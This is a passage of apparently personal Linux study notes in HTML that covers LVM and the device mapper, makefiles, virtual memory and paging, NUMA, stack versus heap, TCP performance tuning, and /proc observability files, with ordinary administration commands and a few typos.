<li><code>sudo vgcreate my_volume /dev/sdd /dev/sde</code></li>
</ul>
</li>
<li>List volume groups:
<pre><code>[azureadmin@centos01 shares]$ sudo vgs
VG        #PV #LV #SN Attr   VSize VFree
my_volume   2   0   0 wz--n- 9.99g 9.99g
</code></pre>
</li>
<li>To expand a volume group, add a PV. Then use <code>vgextend</code> to add the PV to the volume group
<ul>
<li><code>sudo vgextend my_volume /dev/sdf</code></li>
</ul>
</li>
<li>You can also remove a physical volume from the volume group:
<ul>
<li><code>sudo vgreduce my_volume /dev/sdf</code></li>
</ul>
</li>
<li>Then you can remove the physical volume:
<ul>
<li><code>sudo pvremove /dev/sdf</code></li>
</ul>
</li>
<li>Logical volumes are like partitions</li>
<li>you can create a new logical volume:
<ul>
<li><code>sudo lvcreate --size 3G --name partition1 my_volume</code></li>
</ul>
</li>
<li>To grow a logical volume to use all the space it has available
<ul>
<li><code>suod lvresize --extents 100%VG my_volume/partition1</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="device-mapper"><a class="header" href="#device-mapper">Device Mapper</a></h4>
<ul>
<li>The kernel uses a driver called the device mapper to route requests for  a location on a logical volume‚Äôs block device to the true location on an actual device. After LVM has determined the structure of the logical volumes from all of the headers on the PVs, it communicates this the kernel‚Äôs device mapper driver in order to initialize the block devices for the logical volumes and load their mapping tables. It achieves this with the ioctl(2) syscall on the <code>/dev/mapper/control</code> device file</li>
<li>To get an inventory of mapped devices currently serviced by the device mapper, use <code>dmsetup</code>:
<ul>
<li><code>dmsetup info</code></li>
</ul>
</li>
<li>There is a header at the beginning of every LVM PV that identifies the volume as well as it‚Äôs volume groups and the logical volumes within.
<ul>
<li>You can view the lvm header on a physical volume using <code>dd</code>:
<ul>
<li><code>dd if=&lt;path to pv&gt; count=1000 | strings | less</code></li>
<li>Example: <code>dd if=/dev/sdb1 count=1000 | strings | less</code></li>
</ul>
</li>
<li></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="make"><a class="header" href="#make">make</a></h1>
<p>The basic idea behind make is the <em>target</em>, a goal that you want to achieve.</p>
<ul>
<li>A target can be a file or a label.</li>
<li>Targets can have dependencies.
To build a target, make follows <em>rules</em>.</li>
</ul>
<h4 id="a-simple-makefile"><a class="header" href="#a-simple-makefile">A simple makefile</a></h4>
<pre><code class="language-sh"># object files
OBJS=aux.o main.o
$myVar="building..."

all: myprog

myprog:
  echo $myVar
  $(OBJS)
  $(CC) -o myprog $(OBJS)
</code></pre>
<p>In the example above, the # in the first line denotes a comment. The second line is a macro definition that sets the <code>OBJS</code> variable to two file names. <em>all</em> is the first <strong>target</strong>. Macros are different from variables. Macro‚Äôs do not change after make has started building a target, variables can change. Variables begin with a <code>$</code>. The first target is always the default. The default target is used when you run <code>make</code> on the command line with no targets specified. The rule for building a target comes after the ‚Äú:‚Äù. <strong>make is very strict about tabs!</strong></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="memory"><a class="header" href="#memory">memory</a></h1>
<p>The CPU has a memory management unit (MMU) to add flexibility in accessing memory. The kernel assists the MMU by breaking down the memory used by a process into chunks called ‚Äòpages‚Äô. The kernel maintains a data structure, called a ‚Äòpage table‚Äô, that maps a process‚Äôs virtual page addresses into real page addresses in memory. As a process accesses memory, the MMU translates the virtual addresses used by the process into real addresses based on the kernel‚Äôs page table.</p>
<p>
A user process doesn't need all of it's memory to be immediately available in order to run. The kernel general loads and allocates pages as a process needs them; this system is known as on-demand paging or just demand paging. Let's see how a program starts and runs as a new process:
</p>

1) The kernel loads the beginning of the program's instruction code into memory pages.
2) Th ekernel may allocate some working-memory pages to the new process
3) As the process runs, it may determine that the next instruction in code isn't in any of the memory pages that the kernel loaded initially. At this point, the kernel will take over and load the necessary page into memory, and then lets the program resume execution.
<p>
You can get a system's page size by looking at the kernel configuration:
</p>

<pre><code class="language-sh">getconfig PAGE_SIZE
4096
</code></pre>
<h2 id="page-faults"><a class="header" href="#page-faults">Page Faults</a></h2>
<p>
If a memory page isn't ready when a process wants to use it, the process triggers a page fault. If a page fault occurs, the kernel takes control of the CPU from the process in order to get the page ready. There are two kinds of page faults, major and minor.
</p>

<p>
Minor page faults occur when the page is in main memory, but the MMU doesn't know where it is. A major page fault occurs when the desired memory page isn't in main memory at all, which means that the kernel must load it from disk or some other slow storage media. Major page faults will bog down a system. Some major page faults are unavoidable, like when the system loads the code from disk when running a program for the first time.
</p>

<p>You can drill down to the page faults for individual processes by using the <code>top</code>, <code>ps</code>, and <code>time</code> commands. You‚Äôll need to use the system version of time for this.</p>
<pre><code class="language-sh">ryan:todo/  |main ?:3 ‚úó|$ /usr/bin/time cal &gt; /dev/null
0.00user 0.00system 0:00.00elapsed 100%CPU (0avgtext+0avgdata 2824maxresident)k
0inputs+0outputs (0major+130minor)pagefaults 0swaps
</code></pre>
<p>As you can see in the output above, there were 0 major page faults and 130 minutes page faults when running the <code>cal</code> program.</p>
<h2 id="virtual-memory"><a class="header" href="#virtual-memory">Virtual Memory</a></h2>
<ul>
<li>
<p>The OS‚Äôs process abstraction provides each process with a virtual memory space. Virtual memory is an abstraction that gives each process its own private, logical address space in which its instructions and data are stored. Each process‚Äôs virtual address space can be thought of as an array of addressable bytes from 0 up to some maximum address. Processes cannot access the contents of one another‚Äôs address spaces.</p>
</li>
<li>
<p>Operating systems implement virtual memory as part of the lone view abstraction of processes. That is, each process only interacts with memory in terms of its own virtual address space rather than the reality of many processes sharing the computers RAM simultaneously.</p>
</li>
<li>
<p>A process‚Äôs virtual address space is divided into several sections, each of which stores a different part of the process‚Äôs memory. The top part is reserved for the OS and can only be accessed in kernel mode. The text and data parts of a process‚Äôs virtual addresss space are initialized from the program executable file. The text section contains the program instructions, and the data section contains global variables. The stack and heap sections vary in size as the process runs. Stack space grows in response to the process making function calls, and shrinks as it returns from the function calls. Heap space grows when the process dynamically allocates memory space (via calls to malloc), and shrinks when the process frees memory space (with calls to free). The heap and stack portions of a process‚Äôs memory are typically located far apart in its address space to maximize the amount of space either can use. Typically, the stack is located at the bottom of a process‚Äôs address space and grows upward. The heap is located at the top of the stack and grows downward.</p>
<pre><code>--------------------------------
|            OS Code           |
--------------------------------
|       Application Code       |
--------------------------------
|      Data (Global Vars)      |
--------------------------------
|             Heap             |
|             ‚åÑ‚åÑ‚åÑ‚åÑ             |
|                              |
|                              |
--------------------------------
|                              |
|                              |
|            ^^^^^             |
|            Stack             |
--------------------------------
</code></pre>
</li>
<li>
<p>A page fault occurs when a process tries to access a page that is not currently stored in RAM. The opposite is a page hit. To handle a page fault, the OS needs to keep track of which RAM frames are free so that it can find a free frame of RAM into which the page read from disk can be stored.</p>
</li>
<li>
<p>Page Table Entries (PTE) include a dirty bit that is used to indicate if the in-RAM copy of the page has been modified.</p>
</li>
</ul>
<h2 id="memory-addresses"><a class="header" href="#memory-addresses">Memory Addresses</a></h2>
<ul>
<li>Because processes operate within their own virtual address spaces, operating systems must make an important distinction between two types of memory addresses. Virtual addresses refer to storage locations in a processes virtual address space, and physical addresses refer to a location in RAM.</li>
<li>At any point in time, the OS stores in RAM the address space contents of many processes as well as OS code that it may map into every process‚Äôs virtual address space.</li>
</ul>
<h3 id="virtual-memory-and-virtual-addresses"><a class="header" href="#virtual-memory-and-virtual-addresses">Virtual Memory and Virtual Addresses</a></h3>
<ul>
<li>Virtual memory is the per-process view of its memory space, and virtual addresses are addresses in the process‚Äôs view of its memory. If two processes run the same binary executable, then they have will have the exact same virtual addresses for function code and for global variables in the address spaces.</li>
<li>Processors generally provide some hardware support for virtual memory. An OS can make use of this hardware support for virtual memory to perform virtual to physical address translation quickly, avoiding having to trap to the OS to handle every address translation.</li>
<li>The memory management unit (MMU) is the part of the computer hardware that implements address translation. At it‚Äôs most complete, the MMU performs full translation.</li>
</ul>
<h2 id="paging"><a class="header" href="#paging">Paging</a></h2>
<ul>
<li>Although many virtual memory systems have been implemented over the years, paging is now the mostly widely used imlementation of virtual memory.</li>
<li>In a Paged virtual memory system, the OS divides the virtual address space of each process into fixed-sized chunks called pages. The OS defines the page size for the system. Page sizes of a few kilobytes are commonly used in general purpose operating systems today. 4 KB is the default page size on many systems.</li>
<li>Physical memory is similarly divided into page-sized chunks called frames. Because pages and frames are defined to be the same size, any page of a process‚Äôs virtual memory can be stored in any frame of physical RAM.</li>
</ul>
<h3 id="virtual-and-physical-addresses-in-paged-systems"><a class="header" href="#virtual-and-physical-addresses-in-paged-systems">Virtual and Physical Addresses in Paged Systems</a></h3>
<ul>
<li>Paged virtual memory systems divide the bits of a virtual address into two parts; the high-order bits specify the page number on which the virtual address is stored, and the low-order bits correspond to the byte offset within the page (which byte from the top of the page corresponds to the address).</li>
<li>Similarly, paging systems divide physical addresses into two parts; the high-order bits specify the frame number of physical memory, and the low-order bits specify the byte offset within the frame. Because frames and pages are the same size, the byte offset bits in a virtual address are identical to the byte offset bits in its translated physical address. Virtual addresses differ from their translated physical addresses in their high-order bits, which specify the virtual page number and the physical frame number.</li>
</ul>
<h3 id="page-tables"><a class="header" href="#page-tables">Page tables</a></h3>
<ul>
<li>Because every page of a processes virtual memory space can map to a different frame of RAM, the OS must maintain mappings for every virtual page in the process‚Äôs address space. The OS keeps a per-process page table that it uses to store the process‚Äôs virtual page number to physical frame number mappings.</li>
</ul>
<h2 id="translation-look-aside-buffer-tlb"><a class="header" href="#translation-look-aside-buffer-tlb">Translation Look-aside Buffer (TLB)</a></h2>
<ul>
<li>Although paging has many benefits, it also results in a significant slowdown to every memory access. In a paged virtual memory system, every load and store to a virtual memory address requires two RAM accesses; the first reads the page table entry (PTE) to get the frame number for virtual-to-physical address translation, and the second reads or writes the byte(s) at the physical RAM address. Thus, in a paged virtual memory system, every memory access is twice as slow as in a sytem that supports direct physical RAM addressing.</li>
<li>One way to reduce the additional overhead of paging is to cache page table mappings of virtual page numbers to physical frame numbers. When translating a virtual address, the MMU first checks for the page numbers in the cache. If found, then the page‚Äôs frame number mapping can be grabbed from the cache entry, avoiding one RAM access for reading the PTE.</li>
<li>A translation look-aside buffer (TLB) is a hardware cache that stores (page number, frame number) mappings. It is a small, fully associative cache that is optimized for fast lookups in hardware. When the MMU finds a mapping in the TLB (a TLB hit), a page table lookup is not needed, and only one RAM access is required to execute a load or store to a virtual memory address.</li>
</ul>
<h1 id="how-linux-organizes-virtual-memory"><a class="header" href="#how-linux-organizes-virtual-memory">How Linux Organizes Virtual Memory</a></h1>
<h2 id="uva-user-virtual-addressing"><a class="header" href="#uva-user-virtual-addressing">UVA (User Virtual Addressing)</a></h2>
<h2 id="kva-kernel-virtual-addressing"><a class="header" href="#kva-kernel-virtual-addressing">KVA (Kernel Virtual Addressing)</a></h2>
<h1 id="how-linux-organizes-physical-memory"><a class="header" href="#how-linux-organizes-physical-memory">How Linux Organizes Physical Memory</a></h1>
<p>At boot, the kernel organizes and partitions RAM into a tree like heirarchy consisting of nodes, zones, and page frames (page frames are physical pages of RAM). The top level of the heirarchy is made up of nodes, which represent a collection of memory that is local to a particular CPU or group of CPUs. Each node contains one or more zones, which are collections of page frames that share similar characteristics. The zones are further divided into page frames, which are the smallest unit of memory that can be allocated by the kernel.</p>
<p>Any processor core can access any physical memory location, regardless of which node it belongs to. However, accessing memory that is local to the core‚Äôs node is faster than accessing memory that is located on a different node. This is because local memory access avoids the overhead of traversing interconnects between nodes.</p>
<h2 id="numa-vs-uma"><a class="header" href="#numa-vs-uma">NUMA vs. UMA</a></h2>
<p>Essentially, nodes are data structures that are used to denote and abstract a physical RAM module on the system motherboard and its associated controller chipset. Actual hardware is being abstracted via software. Two types of memory architectures exist, UMA (Uniform Memory Access) and NUMA (Non-Uniform Memory Access).</p>
<h4 id="numa"><a class="header" href="#numa">NUMA</a></h4>
<ul>
<li>In a NUMA architecture, each processor has its own local memory, and accessing local memory is faster than accessing memory that is located on a different node. This is because local memory access avoids the overhead of traversing interconnects between nodes.</li>
<li>NUMA architectures are commonly used in high-performance computing systems, where multiple processors are used to perform complex computations. By using NUMA, these systems can achieve better performance and scalability than traditional UMA architectures.</li>
<li>NUMA systems must have at least 2 physical memory banks (nodes) to be considered NUMA.</li>
<li>One can use the <code>lstopo</code> command to view the NUMA topology of a system. The output will show the number of nodes, the amount of memory in each node, and the CPUs that are associated with each node. <code>hwloc</code> is another tool that can be used to view the NUMA topology of a system. It provides a graphical representation of the system‚Äôs hardware topology, including the NUMA nodes and their associated memory and CPUs.</li>
<li>The number of zones per node is dynamically determined by the kernel at boot time based on the amount of memory in the node and the system architecture. The kernel typically creates three zones per node: DMA, DMA32, and Normal. The DMA zone is used for memory that is accessible by devices that use direct memory access (DMA), the DMA32 zone is used for memory that is accessible by 32-bit devices, and the Normal zone is used for all other memory. In addition to these standard zones, the kernel may also create additional zones based on the system architecture and configuration. You can view <code>/proc/buddyinfo</code> to see the memory zones and their associated page frames.</li>
</ul>
<pre><code class="language-bash">Œª ch7 (main) $ cat /proc/buddyinfo
Node 0, zone      DMA      0      0      0      0      0      0      0      0      1      1      2
Node 0, zone    DMA32      6      6      8      7      5      6      7      4      8      9    283
Node 0, zone   Normal   3170   7694  10543   8113   5011   1761    552    182     55     66  10595
</code></pre>
<h4 id="uma"><a class="header" href="#uma">UMA</a></h4>
<ul>
<li>In a UMA architecture, all processors share the same physical memory, and accessing any memory location takes the same amount of time, regardless of which processor is accessing it.</li>
<li>In Linux, UMA systems are treated as NUMA systems with a single node. This means that the kernel still uses the same data structures and algorithms for managing memory, but there is no need to consider the locality of memory access.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="memory-management"><a class="header" href="#memory-management">Memory Management</a></h1>
<ul>
<li>When you get done using heap memory, it needs to be cleaned up. This can done using a process known as ‚Äògarbage collection‚Äô, or manually by the developer when creating the app</li>
<li>Implementation of both the stack and heap is usually down to the runtime / OS.</li>
<li>There are 2 memory constructs, stack and heap.</li>
</ul>
<h3 id="stack"><a class="header" href="#stack">Stack:</a></h3>
<ul>
<li>A stack is a structure that represents a sequence of objects or elements that are available in a linear data structure. What does that mean? It simply means you can add or remove elements in a linear order. This way, a portion of memory that keeps variables created can function temporarily.</li>
<li>Stored in computer RAM just like the heap.</li>
<li>Variables created on the stack will go out of scope and are automatically deallocated.</li>
<li>Much faster to allocate in comparison to variables on the heap.</li>
<li>Implemented with an actual stack data structure.</li>
<li>Stores local data, return addresses, used for parameter passing.</li>
<li>Can have a stack overflow when too much of the stack is used (mostly from infinite or too deep recursion, very large allocations).</li>
<li>Data created on the stack can be used without pointers.</li>
<li>You would use the stack if you know exactly how much data you need to allocate before compile time and it is not too big.</li>
<li>Usually has a maximum size already determined when your program starts.</li>
<li>A collection of data needed for a single method is called a stack frame</li>
</ul>
<h3 id="heap-1"><a class="header" href="#heap-1">Heap:</a></h3>
<ul>
<li>Stored in RAM just like the stack.</li>
<li>In C++, variables on the heap must be destroyed manually and never fall out of scope. The data is freed with delete, delete[], or free.</li>
<li>Slower to allocate in comparison to variables on the stack.</li>
<li>Used on demand to allocate a block of data for use by the program.</li>
<li>Can have fragmentation when there are a lot of allocations and deallocations.</li>
<li>In C++ or C, data created on the heap will be pointed to by pointers (from the stack) and allocated with new or malloc respectively.</li>
<li>Can have allocation failures if too big of a buffer is requested to be allocated.</li>
<li>You would use the heap if you don‚Äôt know exactly how much data you will need at run time or if you need to allocate a lot of data.</li>
<li>Responsible for memory leaks.</li>
</ul>
<p>Example:</p>
<pre><code class="language-c">int foo()
{
  char *pBuffer; //&lt;--nothing allocated yet (excluding the pointer itself, which is allocated here on the stack).
  bool b = true; // Allocated on the stack.
  if(b)
  {
    //Create 500 bytes on the stack
    char buffer[500];

    //Create 500 bytes on the heap
    pBuffer = new char[500];

   }//&lt;-- buffer is deallocated here, pBuffer is not
}//&lt;--- oops there's a memory leak, I should have called delete[] pBuffer;
</code></pre>
<h1 id="why-would-an-object-be-created-on-the-heap-or-stack"><a class="header" href="#why-would-an-object-be-created-on-the-heap-or-stack">why would an object be created on the heap or stack?</a></h1>
<p>In computer science, whether an object is created on the heap or the stack depends on several factors, including object size, lifetime, dynamic allocation needs, sharing requirements, and polymorphism.</p>
<ol>
<li>Object size: If the object is small, it can be created on the stack, but if it‚Äôs large, then it should be created on the heap.</li>
<li>Lifetime: If the object‚Äôs lifetime needs to transcend beyond the block/scope where it was created, objects should be created on the heap. Alternatively, If the object‚Äôs lifetime is within the context of the block/scope where it was created, objects can be created on the stack.</li>
<li>Dynamic allocation: Heap objects can be allocated dynamically at runtime, while stack objects need to be allocated at compile time.</li>
<li>Sharing: Heap objects can be shared between multiple threads, while stack objects are local to a single thread.</li>
<li>Polymorphism: Creating objects on the heap allows for polymorphism, where objects of different derived classes can be referenced using a base class pointer.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="network-manager"><a class="header" href="#network-manager">network manager</a></h1>
<ul>
<li>You can use <code>nm-online</code> to check connectivity status</li>
<li>The configuration directory for network manager is at <code>/etc/networkmanager</code> with the main configuration file being <code>NetworkManager.conf</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="networking-1"><a class="header" href="#networking-1">Networking</a></h1>
<h2 id="tcp"><a class="header" href="#tcp">TCP</a></h2>
<p>Connections with TCP are established with a 3-way handshake (SYN-SYNACK-ACK)</p>
<h3 id="performance"><a class="header" href="#performance">Performance</a></h3>
<p>TCP can provide a high rate of throughput even on a high-latency network, by using buffering and a sliding window. TCP also employs congestion control and a congestion window set by the sender, so that it can maintain a high but also reliable rate of transmission across different and varying networks. Congestion control avoids sending too many packets, which could cause congestion and a performance breakdown.</p>
<p>The following is a summary of TCP performance features:</p>
<ul>
<li>Sliding window: This allows multiple packets up to the size of the window to be sent on the network before acknowledgements are received, providing high throughput even on high-latency networks. The size of the window is advertised by the receiver to indicate how many packets it is willing to receive at that time.</li>
<li>Congestion Avoidance: To prevent sending too much data and causing saturation, which can cause packet drops and worse performance.</li>
<li>Slow-start: Part of TCP congestion control, this begins with a small congestion window and then increases it as acknowledgements are received within a certain time. When they are not, the congestion window is reduced.</li>
<li>Selective acknowledgements (SACKs): Allow TCP to acknowledgement discontinuous packets, reducing the number of retransmits required.</li>
<li>Fast retransmit: Instead of waiting on a timer, TCP can retransmit dropped packets based on the arrival of duplicate acks. These are a function of round-trip time and not the typically much slower timer.</li>
<li>Fast recovery: This recovers TCP performance after detecting duplicate ACKs, by resetting the connection to perform slow-start.</li>
<li>TCP Fast open: Allows a client to include data in a SYN packet, so that the server request processing can begin earlier and not wait for the SYN handshake (RFC7413). THis can use a cryptographic cookie to auth the client.</li>
<li>TCP timestamps: Includes a timestamp for sent packets that is returned in the ACK</li>
</ul>
<h3 id="congestion-avoidance-1"><a class="header" href="#congestion-avoidance-1">Congestion avoidance</a></h3>
<p>Routers, switches, hosts, may drop packets when overwhelmed. There are many mechanisms to avoid these problems:</p>
<ul>
<li>Ethernet: Pause Frames</li>
<li>IP: Explicit Congestion Notification (ECN) field</li>
<li>TCP: Congestion Window</li>
</ul>
<h3 id="jumbo-frames"><a class="header" href="#jumbo-frames">Jumbo Frames</a></h3>
<p>The confluence of two components has interfered with the adoption of jumbo frames: older hardware and misconfigured firewalls. Older hardware that does not support jumbo frames can either fragment the packet using the IP protocol (causing a performance cost for packet reassembly), or respond with an ICMP ‚ÄúCan‚Äôt Fragment‚Äù error. Misconfigured firewalls (as a response to an attack known as ‚Äòthe ping of death‚Äô) have been configured by administrators to block all ICMP traffic.</p>
<h3 id="latency"><a class="header" href="#latency">Latency</a></h3>
<p>Latency can occur at various layers of the HTTP request pipeline:</p>
<ul>
<li>DNS lookup Latency</li>
<li>Connection Latency</li>
<li>First-byte latency</li>
<li>Round-trip time (network latency)</li>
<li>Connection Life Span (keepalives or a lack-of)</li>
</ul>
<h3 id="buffering"><a class="header" href="#buffering">Buffering</a></h3>
<p>TCP employs buffering, along with a sliding send window, to improve throughput. Network sockets also have buffers, and applications may also employ their own, to aggregate data before sending.</p>
<p>Buffering can also be performed by external network components, such as switches and routers, in an errot to improve their own throughput. Unfortunately, the use of large buffers on these components can lead to bufferbloat, where packets are queued for long intervals. This causes TCP congestion avoidance on the hosts, which throttles performance. Features have been added to Linux 3.x kernels to address this problem (including byte queue limits, the CoDel queueing discipline, and TCP small queues).</p>
<p>The function of buffering may be best served by the endpoints - the hosts - and not the intermediate network nodes.</p>
<h3 id="connection-backlog"><a class="header" href="#connection-backlog">Connection Backlog</a></h3>
<p>Another type of buffering is for the initial connection requests. TCP implements a backlog, where SYN requests can queue in the kernel before being accepted by the user-land processes. When there are too many TCP connection requests for the process to accept in time, the backlog reaches a limit and SYN packets are dropped, to be later retransmitted by the client. The retransmission of these packets causes latency for the client connect time. The limit is tunable: it is a parameter of the listen syscall, and the kernel may also provide system-wide limits.</p>
<p>Backlog drops and retransmits are indicators of host overload.</p>
<h3 id="connection-queues-in-the-linux-kernel"><a class="header" href="#connection-queues-in-the-linux-kernel">Connection Queues in the Linux Kernel</a></h3>
<p>The kernel employs 2 connection queues to handle bursts of inbound connections:</p>
<ul>
<li>One for incomplete connections (the SYN backlog)</li>
<li>One for established connections (the LISTEN backlog)</li>
</ul>
<p>Only one queue was used in earlier versions of the kernel and it was subject to SYN floods</p>
<p>The use of SYN cookies bypasses the first queue, as they show the client is already authenticated.</p>
<p>The length of these queues can be tuned independently. The LISTEN queue can also be set by the application as the backlog argument to the LISTEN syscall</p>
<h3 id="segmentation-offload"><a class="header" href="#segmentation-offload">Segmentation Offload</a></h3>
<p>Network devicesa and networks accept packet sizes up to a maximum segment size (MSS) that may be as small as 1500 bytes. To avoid the network stack overheads of sending many small packets, Linux also uses Generic Segmentation Offload to send packets up to 64 kbytes in size (super packets), which are split into MSS-sized segments just before delivery to the network device. If the NIC and driver support TCP segmentation offload (TSO), GSO leaves splitting to the device, improving network stack throughput.</p>
<h1 id="tools-3"><a class="header" href="#tools-3">Tools:</a></h1>
<p><code>netstat</code>
<code>ping</code>
<code>ip</code>
<code>ss</code>
<code>nicstat</code>
<code>tcplife</code>
<code>tcptop</code>
<code>tcpdump</code> / <code>wireshark</code>
<code>perf</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-observability-sources"><a class="header" href="#linux-observability-sources">Linux Observability Sources</a></h1>
<p>These interfaces provide the data for observability tools on Linux:</p>
<p><code>/proc</code> - per-process counters
<code>/proc</code>, ‚Äòsys‚Äô - system-wide counters
<code>/sys</code> - device configuration and counters
<code>/sys/fs/cgroup</code> - cgroup statistics
<code>ptrace</code> - per-process tracing
<code>perf_event</code> - Hardware counters (PMCs)
<code>netlink</code> - network statistics
<code>libpcap</code> - network packet capture</p>
<p>Various files are provided in /proc for per-process statistics. Here is an example of what may be available for a given PID:</p>
<p><strong>All examples using /proc/18</strong></p>
<pre><code>[root@docker01 ~]# ll /proc/18
dr-xr-xr-x. 2 root root 0 Jan  9 09:24 attr
-rw-r--r--. 1 root root 0 Jan  9 09:24 autogroup
-r--------. 1 root root 0 Jan  9 09:24 auxv
-r--r--r--. 1 root root 0 Jan  9 09:24 cgroup
--w-------. 1 root root 0 Jan  9 09:24 clear_refs
-r--r--r--. 1 root root 0 Jan  7 14:05 cmdline
-rw-r--r--. 1 root root 0 Jan  9 09:24 comm
-rw-r--r--. 1 root root 0 Jan  9 09:24 coredump_filter
-r--r--r--. 1 root root 0 Jan  9 09:24 cpu_resctrl_groups
-r--r--r--. 1 root root 0 Jan  9 09:24 cpuset
lrwxrwxrwx. 1 root root 0 Jan  9 09:24 cwd -&gt; /
-r--------. 1 root root 0 Jan  9 09:24 environ
lrwxrwxrwx. 1 root root 0 Jan  9 09:24 exe
dr-x------. 2 root root 0 Jan  7 14:06 fd
dr-x------. 2 root root 0 Jan  9 09:24 fdinfo
-rw-r--r--. 1 root root 0 Jan  9 09:24 gid_map
-r--------. 1 root root 0 Jan  9 09:24 io
-r--r--r--. 1 root root 0 Jan  9 09:24 limits
-rw-r--r--. 1 root root 0 Jan  9 09:24 loginuid
dr-x------. 2 root root 0 Jan  9 09:24 map_files
-r--r--r--. 1 root root 0 Jan  9 09:24 maps
-rw-------. 1 root root 0 Jan  9 09:24 mem
-r--r--r--. 1 root root 0 Jan  9 09:24 mountinfo
-r--r--r--. 1 root root 0 Jan  9 09:24 mounts
-r--------. 1 root root 0 Jan  9 09:24 mountstats
dr-xr-xr-x. 7 root root 0 Jan  9 09:24 net
dr-x--x--x. 2 root root 0 Jan  7 15:26 ns
-r--r--r--. 1 root root 0 Jan  9 09:24 numa_maps
-rw-r--r--. 1 root root 0 Jan  9 09:24 oom_adj
-r--r--r--. 1 root root 0 Jan  9 09:24 oom_score
-rw-r--r--. 1 root root 0 Jan  9 09:24 oom_score_adj
-r--------. 1 root root 0 Jan  9 09:24 pagemap
-r--------. 1 root root 0 Jan  9 09:24 patch_state
-r--------. 1 root root 0 Jan  9 09:24 personality
-rw-r--r--. 1 root root 0 Jan  9 09:24 projid_map
lrwxrwxrwx. 1 root root 0 Jan  9 09:24 root -&gt; /
-rw-r--r--. 1 root root 0 Jan  9 09:24 sched
-r--r--r--. 1 root root 0 Jan  9 09:24 schedstat
-r--r--r--. 1 root root 0 Jan  9 09:24 sessionid
-rw-r--r--. 1 root root 0 Jan  9 09:24 setgroups
-r--r--r--. 1 root root 0 Jan  9 09:24 smaps
-r--r--r--. 1 root root 0 Jan  9 09:24 smaps_rollup
-r--------. 1 root root 0 Jan  9 09:24 stack
-r--r--r--. 1 root root 0 Jan  7 14:05 stat
-r--r--r--. 1 root root 0 Jan  9 09:24 statm
-r--r--r--. 1 root root 0 Jan  7 14:05 status
-r--------. 1 root root 0 Jan  9 09:24 syscall
dr-xr-xr-x. 3 root root 0 Jan  9 09:24 task
-rw-r--r--. 1 root root 0 Jan  9 09:24 timens_offsets
-r--r--r--. 1 root root 0 Jan  9 09:24 timers
-rw-rw-rw-. 1 root root 0 Jan  9 09:24 timerslack_ns
-rw-r--r--. 1 root root 0 Jan  9 09:24 uid_map
-r--r--r--. 1 root root 0 Jan  9 09:24 wchan
</code></pre>
<p>The exact list of files depends on the kernel version and CONFIG options. Those related to per-process performance observability include:
<code>limits</code> - in-effect resource limits
<code>maps</code> - mapped memory regions
<code>sched</code> - various CPU scheduler statistics
<code>schedstat</code> - CPU runtime, latency, and time slices
<code>smaps</code> - mapped memory regions with usage statistics
<code>stat</code> - Process status and statistics, including total CPU and memory usage
<code>statm</code> - memory usage summary in units of pages
<code>status</code> - stat and statm information, labeled
<code>fd</code> - directory of file descriptor symlinks
<code>cgroup</code> - cgroup memborship information
<code>task</code> - directory of per-task statistics</p>
<p><code>/proc</code> also contains system-wide statistics in these directories:</p>
<pre><code>[root@docker01 proc]# ls -Fd /proc [a-z]*
acpi/      bus/     consoles  devices    driver/      filesystems  iomem    kallsyms  key-users    kpagecount  locks    misc     mtrr          partitions   schedstat  slabinfo  swaps          sysvipc/      tty/     vmallocinfo
asound/    cgroups  cpuinfo   diskstats  execdomains  fs/          ioports  kcore     kmsg         kpageflags  mdstat   modules  net@          /proc/       scsi/      softirqs  sys/           thread-self@  uptime   vmstat
buddyinfo  cmdline  crypto    dma        fb           interrupts   irq/     keys      kpagecgroup  loadavg     meminfo  mounts@  pagetypeinfo  sched_debug  self@      stat      sysrq-trigger  timer_list    version  zoneinfo
</code></pre>
<ul>
<li>
<p><strong>/proc/cpuinfo</strong></p>
<ul>
<li>Description: Contains information about the CPU such as its type, make, model, number of cores, and processing power.</li>
</ul>
</li>
<li>
<p><strong>/proc/meminfo</strong></p>
<ul>
<li>Description: Provides details on the system‚Äôs memory usage including total and available physical memory, swap space, and various other memory parameters.</li>
</ul>
</li>
<li>
<p><strong>/proc/loadavg</strong></p>
<ul>
<li>Description: Shows the load average of the system, indicating how busy the system is. Displays averages over 1, 5, and 15 minutes.</li>
</ul>
</li>
<li>
<p><strong>/proc/uptime</strong></p>
<ul>
<li>Description: Indicates how long the system has been running since its last restart.</li>
</ul>
</li>
<li>
<p><strong>/proc/mounts</strong></p>
<ul>
<li>Description: Lists all the mounts currently in use by the system, similar to the <code>mount</code> command.</li>
</ul>
</li>
<li>
<p><strong>/proc/net</strong></p>
<ul>
<li>Description: Contains various network-related information including network configuration, statistics, connections, and more.</li>
</ul>
</li>
<li>
<p><strong>/proc/partitions</strong></p>
<ul>
<li>Description: Shows the partition table of all the storage devices in the system.</li>
</ul>
</li>
<li>
<p><strong>/proc/cmdline</strong></p>
<ul>
<li>Description: Displays the parameters passed to the kernel at the time it was started.</li>
</ul>
</li>
<li>
<p><strong>/proc/version</strong></p>
<ul>
<li>Description: Contains information about the version of the Linux kernel, GCC version used for the kernel build, and the build time.</li>
</ul>
</li>
<li>
<p><strong>/proc/filesystems</strong></p>
<ul>
<li>Description: Lists all the file systems currently supported by the kernel.</li>
</ul>
</li>
<li>
<p><strong>/proc/sys</strong></p>
<ul>
<li>Description: Contains a collection of interfaces to query and modify kernel parameters at runtime.</li>
</ul>
</li>
</ul>
<h2 id="sys"><a class="header" href="#sys"><code>/sys</code></a></h2>
<ul>
<li>Linux provides a sysfs file system, mounted on <code>/sys</code>, which was introduced with the 2.6 kernel to provide a directory based structure for kernel statistics.</li>
</ul>
<h2 id="netlink"><a class="header" href="#netlink">netlink</a></h2>
<ul>
<li>Netlink is a special socket address family (AF_NETLINK) for fetching kernel information.</li>
<li>To use Netlink, open a socket with the <code>AF_NETLINK</code> address family and then use a series of send(2) and recv(2) calls to pass requests and receiving information in binary structs.</li>
<li>The <code>libnetlink</code> library helps with usage.</li>
</ul>
<h2 id="tracepoints"><a class="header" href="#tracepoints">Tracepoints</a></h2>
<ul>
<li>Tracepoints are a Linux Kernel event source based on static instrumentation.</li>
